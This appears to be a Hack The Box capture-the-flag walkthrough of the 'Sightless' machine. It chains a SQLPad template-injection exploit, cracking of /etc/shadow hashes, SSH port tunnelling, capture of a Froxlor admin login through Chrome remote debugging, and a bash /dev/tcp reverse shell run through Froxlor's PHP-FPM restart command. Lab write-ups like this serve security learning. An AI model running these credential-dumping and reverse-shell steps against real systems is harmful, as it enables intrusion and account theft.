---
title: Hack The Box - Sightless Walkthrough
date: 2024-09-26 12:00:00 +/-TTTT
categories: [Security, HackTheBox]
tags: [hackthebox]     # TAG names should always be lowercase
description: Season 6 - Week 6 / Difficulty - Easy
media_subpath: /assets/img/htb/sightless/
---

![Sightless Info Card](Sightless.png){: w="600" }

> Note:  All passwords, hashes, and flags have been changed in this walkthrough.
{: .prompt-info }


# Enumeration

A quick nmap reveals 3 open ports; SSH, HTTP, and FTP with a banner noting sightless.htb.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 22:49 EDT
Nmap scan report for 10.10.11.32
Host is up (0.040s latency).
Not shown: 997 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Attempting to browse to the website redirects to http://sightless.htb which obviously wont resolve.

![Sightless Not Found](sightless.htb.missing.png)

Adding the required entry to our /etc/hosts file:

```
┌──(root㉿kali)-[/home/…/Downloads/HTB/Sightless]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.32     sightless.htb
```

We then find that the site now loads and includes two interesting links; a sql playground called sqlpad and a server administration platform called Froxlor.  Clicking the link for sqlpad we are met with yet another site not found.  Add yet another entry to our hosts file...

```
──(root㉿kali)-[/home/kali/Downloads/HTB/Sightless]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.32     sightless.htb   sqlpad.sightless.htb
```

...and we have access to the workspace.  Checking the About modal in the UI tells us the version.

![SQLPad Workspace](sqlpad.workspace.png)

A quick search for vulns reveals [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944) which notes template injection in the connection test point resulting in remote code execution.  As luck would have it, theres a public exploit available at [0xRoqeeb Github](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944).

Set up the listener with netcat, run the exploit, and we get a root shell on the machine; or do we?

![SQLPad Exploited](container.exploited.png)

Poking around the filesystem we find a docker entrypoint.  This is a container.

```
root@c184118df0a6:/var/lib/sqlpad# ls /
ls /
bin
boot
dev
docker-entrypoint
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@c184118df0a6:/var/lib/sqlpad# 
```
Checking for users we find:  michael and node.

```
root@c184118df0a6:/var/lib/sqlpad# ls /home
ls /home/                                                                
michael                                                                  
node                                                                     
root@c184118df0a6:/var/lib/sqlpad#
```

As root we dump /etc/passwd and /etc/shadow to see if we can crack these offline for possible reuse.

```
root@c184118df0a6:/# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
root@c184118df0a6:/# cat /etc/shadow
```
```
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root@c184118df0a6:/# 
```

On our VM we attempt to crack.  We have success for root and michael.

```
──(root㉿kali)-[/home/kali/Downloads/HTB/Sightless]
└─# unshadow passwd shadow > hashes

┌──(kali㉿kali)-[~/Downloads/HTB/Sightless]
└─$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
brightside        (root)     
shags2dope (michael)     
2g 0:00:00:27 DONE (2024-09-26 17:45) 0.07331g/s 2148p/s 3603c/s 3603C/s kruimel..galati
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We try michael's newly acquired password on the host and have our user flag!  Root; not as lucky.

```
┌──(root㉿kali)-[/home/kali/Downloads/HTB/Sightless]
└─# ssh michael@10.10.11.32                       
michael@10.10.11.32's password: 
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
michael@sightless:~$ ls
user.txt
michael@sightless:~$ cat user.txt
e1958ad90f361b9da3a547caa84c0xdd
```
```
┌──(kali㉿kali)-[~]
└─$ ssh root@10.10.11.32
root@10.10.11.32's password: 
Permission denied, please try again.
root@10.10.11.32's password:
```

Back to enumeration.  Attempting to download linpeas on the box itself fails and is blocked.  Lets attempt to transfer using michael's creds.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sftp michael@10.10.11.32            
michael@10.10.11.32's password: 
Connected to 10.10.11.32.
sftp> ls
user.txt  
sftp> put linpeas.sh 
Uploading linpeas.sh to /home/michael/linpeas.sh
linpeas.sh                                                        100%  806KB   2.2MB/s   00:00    
sftp> ls
linpeas.sh  user.txt    
sftp> exit
```

Linpeas delivers a lot of interesting information.  Analysing the hosts file, we see an additional subdomain for admin.sightless.htb.  We also find an enabled nginx site config for the same.  Note that this site listens on 8080...which did not show open.  Attempting to access confirms.

```
╔══════════╣ Hostname, hosts and DNS
sightless                                                                                                                               
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb
```
```
lrwxrwxrwx 1 root root 35 May 15 04:27 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/froxlor
        ServerName admin.sightless.htb
        ServerAlias admin.sightless.htb
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
![admin.sightless.htb not available](admin.sightless.htb.not.available.png)

It seems this site is only available from the host.  Looks like we will need to tunnel our traffic.  Reconnecting to the host and tunneling 8080, and changing our hosts file to match, we are able to load the site!  It's Froxlor.
```
┌──(root㉿kali)-[/home/kali/Downloads/HTB/Sightless]
└─# ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32                           
michael@10.10.11.32's password: 
Last login: Thu Sep 26 23:23:59 2024 from 10.10.14.241
michael@sightless:~$ 
```
```
┌──(root㉿kali)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.32     sightless.htb   sqlpad.sightless.htb
127.0.0.1       admin.sightless.htb
```
![Froxlor Login](froxlor.login.png)

But what about credentials?  We attempt all known creds with no success.  Let's take a further look into Linpeas output and see if anything else catches our eye.

Here we see user john is running chrome with remote debugging enabled.  Normally this listens on a specific port, but when set to 0 as it is below, it is random.  If we can find the port, maybe we can connect and get some interesting traffic?

```
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes             
john        1606  0.7  2.8 34019516 112268 ?     Sl   21:14   0:23              |   _ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.85jJpg data:,
john        1659  3.2  4.3 1186799472 171792 ?   Sl   21:14   1:47              |       |   _ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1608 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1727385123876730 --launc
```

Further down, we find active listening ports.  We can rule many of them out as we know what they are.  Theres a non zero chance that two of the remaining match the listed debug processes above.  Let's tunnel those too.

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                           
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                       
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34945         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39699         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41937         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```
```
┌──(root㉿kali)-[/home/kali/Downloads/HTB/Sightless]
└─# ssh -L 8080:127.0.0.1:8080 -L 33060:127.0.0.1:33060-L 34945:127.0.0.1:34945 -L 39699:127.0.0.1:39699 -L 41937:127.0.0.1:41937 michael@10.10.11.32                           
michael@10.10.11.32's password: 
Last login: Thu Sep 26 23:23:59 2024 from 10.10.14.241
michael@sightless:~$ 
```

Pulling up chrome, we need to attempt to connnect to debug.  Enter chrome://inspect in the address bar and configure discovery targets.

![Chrome Inspect](chrome.inspect.png)

And we manage to capture our admin logging in to the Froxlor admin console.

![Chrome Inspect Results](chrome_inspect_results.png)

Logging into the admin panel we find it is v2.1.8 and running php-fpm.  It also happens to be running as root.

![Froxlor PHPFPM](froxlor_phpfpm.png)

Knowing this, maybe we can abuse the phpfpm restart command to gain access.  A reverse shell perhaps?  On our attack vm we set up the listener, and then attempt on the host by creating a new phpfpm version.  It looks like the restart command does sanitize the input to some extent, because we get an error when attempting to save.

```
┌──(root㉿kali)-[/home/kali/Downloads/HTB/Sightless]
└─# nc -nlvp 4444
listening on [any] 4444 ...

```

![Froxlor Shell Error](froxlor_shell_error.png)

Maybe if we save our command into a shell script and call that?

```
michael@sightless:~$ echo "bash &>/dev/tcp/10.10.14.116/4444 <&1" > revshell.sh
michael@sightless:~$ cat revshell.sh 
bash &>/dev/tcp/10.10.14.116/4444 <&1
michael@sightless:~$ chmod +x revshell.sh
```

![Froxlor Reverse shell](froxlor_reverse_shell_cmd.png)

Use the admin interface to disable and re-enable PHPFPM.

![Froxlor PHPFPM Restart](froxlor_phpfpm_restart.png)

Success!  We have our shell and flag.

```
┌──(root㉿kali)-[/home/kali/Downloads/HTB/Sightless]
└─# nc -nlvp 4444
listening on [any] 4444 ...


connect to [10.10.14.116] from (UNKNOWN) [10.10.11.32] 35142
whoami
root

pwd 
/root

ls
docker-volumes
root.txt
scripts

cat root.txt
de0e4f8649ddee7920359d820071d562
```